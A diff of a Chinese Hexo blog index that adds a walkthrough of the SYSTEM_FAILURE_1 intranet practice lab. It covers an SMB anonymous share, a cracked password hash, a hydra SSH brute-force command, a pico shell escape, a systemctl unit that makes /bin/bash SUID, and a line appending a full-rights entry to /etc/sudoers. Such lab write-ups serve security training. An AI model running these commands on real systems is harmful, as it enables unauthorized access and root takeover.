@@ -185,6 +185,138 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/16/SYSTEM-FAILURE-1%E9%9D%B6%E5%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="吕宙航">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/16/SYSTEM-FAILURE-1%E9%9D%B6%E5%9C%BA/" class="post-title-link" itemprop="url">SYSTEM_FAILURE_1靶场</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-09-16 17:57:06" itemprop="dateCreated datePublished" datetime="2023-09-16T17:57:06+08:00">2023-09-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-18 19:34:46" itemprop="dateModified" datetime="2023-09-18T19:34:46+08:00">2023-09-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">内网靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>跟着别人的视频打一下。</p>
+<p>靶场直接就给了ip地址，用nmap扫一下端口</p>
+<p><img src="/pic/sf1/1.png"></p>
+<p>开放了445端口,445端口默认开放的是SMB服务，可以利用相关的工具,<code>smbclient</code>、<code>smbmap</code></p>
+<p><img src="/pic/sf1/2.png"></p>
+<p>用<code>smbmap</code>扫描可以发现有一个匿名的共享,用<code>smbclient</code> //ip/anonymous连接，空密码直接回车就行。</p>
+<p><img src="/pic/sf1/3.png"></p>
+<p>查看文件发现只有一个share，用<code>get share</code>下载下来,查看share文件。</p>
+<p><img src="/pic/sf1/4.png"></p>
+<p>给了<code>Admin</code>和<code>89492D216D0A212F8ED54FC5AC9D340B</code>，猜测是账号密码，md5解密得<code>qazwsxedc</code>，用xftp连接，或者用lftp连接也可以。</p>
+<p><img src="/pic/sf1/5.png"></p>
+<p>ftp可以连接，ssh试过之后也可以连接。利用<code>linpeas.sh</code>搜集一下有没有可以提权的东西</p>
+<blockquote>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+</blockquote>
+<p><img src="/pic/sf1/6.png"></p>
+<p>但是用户权限太低，没有办法提权。</p>
+<p>cd到/Syst3m/F4iluR3,里面有很多文件</p>
+<p><img src="/pic/sf1/7.png"></p>
+<p>他们的大小也都差不多，用<code>find ./ -size +1696c</code>命令找一下有没有不正常的文件,确实能找到<code>file0189.txt</code>，用<code>diff</code>命令可以比一下他与其他的文件有什么不同，但是发现文件内容是一行的，所以要给他们变成单行的。</p>
+<p><code>cat file0189.txt |xargs -n 1 &gt; /tmp/tmp1</code> <code>cat file.txt |xargs -n 1 &gt; /tmp/tmp1</code>然后再用diff判断他们有什么不同。</p>
+<p><img src="/pic/sf1/9.png"></p>
+<p>发现后面有一串不一样的，需要解密，base62解密得到<code>/Sup3rS3cR37</code></p>
+<p>这个文件夹在<code>/var/www/html/area4</code>里,下载useful.txt，查看<code>/etc/passwd</code>能发现用户名，利用<code>hydra</code>进行爆破</p>
+<p><img src="/pic/sf1/10.png"></p>
+<p>命令:<code>hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-V 显示详细信息</span><br><span class="line">-I 忽略现有的恢复文件（不要等待 10 秒）</span><br><span class="line">-e “n”表示空密码，“s”尝试登录为通过，“r”尝试反向登录为通过</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/sf1/11.png"></p>
+<p>可以爆破出来密码，登录valex用户。</p>
+<p><img src="/pic/sf1/12.png"></p>
+<p><code>sudo -l</code>：列出用户可以执行和不可以执行的命令。</p>
+<p>可以发现<code>jin</code>用户可以用pico。在网上能找到nano的提权方式</p>
+<p>执行命令<code>sudo -u jin /usr/bin/pico</code> 然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/sf1/14.png"></p>
+<p>然后就到<code>jin</code>这个用户了,这个时候就可以执行<code>systemctl</code>了，这个时候就可以用<code>systemctl</code>进行提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp).service</span><br><span class="line">echo &#x27;[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target&#x27; &gt; $TF</span><br><span class="line">./systemctl link $TF</span><br><span class="line">./systemctl enable --now $TF</span><br></pre></td></tr></table></figure>
+
+<p>或者修改sudoers</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo \&quot;admin ALL=(ALL:ALL) ALL&quot;&gt;&gt;/etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/sf1/15.png"></p>
+<p>读取到root.txt</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/01/TFCCTF2023/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -208,10 +340,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-08-01 10:49:21 / 修改时间：11:48:12" itemprop="dateCreated datePublished" datetime="2023-08-01T10:49:21+08:00">2023-08-01</time>
+              <time title="创建时间：2023-08-01 10:49:21" itemprop="dateCreated datePublished" datetime="2023-08-01T10:49:21+08:00">2023-08-01</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-18 17:41:11" itemprop="dateModified" datetime="2024-03-18T17:41:11+08:00">2024-03-18</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -219,6 +357,10 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
                 </span>
             </span>
 
@@ -430,10 +572,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-07-11 15:20:40 / 修改时间：21:32:21" itemprop="dateCreated datePublished" datetime="2023-07-11T15:20:40+08:00">2023-07-11</time>
+              <time title="创建时间：2023-07-11 15:20:40" itemprop="dateCreated datePublished" datetime="2023-07-11T15:20:40+08:00">2023-07-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-18 17:41:31" itemprop="dateModified" datetime="2024-03-18T17:41:31+08:00">2024-03-18</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -441,6 +589,10 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
                 </span>
             </span>
 
@@ -677,7 +829,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-01 14:36:03" itemprop="dateModified" datetime="2023-07-01T14:36:03+08:00">2023-07-01</time>
+                <time title="修改时间：2024-03-18 17:41:24" itemprop="dateModified" datetime="2024-03-18T17:41:24+08:00">2024-03-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -686,6 +838,10 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
                 </span>
             </span>
 
@@ -777,7 +933,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-03 12:36:50" itemprop="dateModified" datetime="2023-07-03T12:36:50+08:00">2023-07-03</time>
+                <time title="修改时间：2024-03-18 17:41:34" itemprop="dateModified" datetime="2024-03-18T17:41:34+08:00">2024-03-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -786,6 +942,10 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
                 </span>
             </span>
 
@@ -1311,97 +1471,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/26/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="吕宙航">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/26/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-26 17:53:28" itemprop="dateCreated datePublished" datetime="2023-02-26T17:53:28+08:00">2023-02-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-27 15:36:37" itemprop="dateModified" datetime="2022-11-27T15:36:37+08:00">2022-11-27</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>367</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1471,14 +1540,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1520,12 +1589,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">91k</span>
+    <span title="站点总字数">93k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:23</span>
+    <span title="站点阅读时长">1:24</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
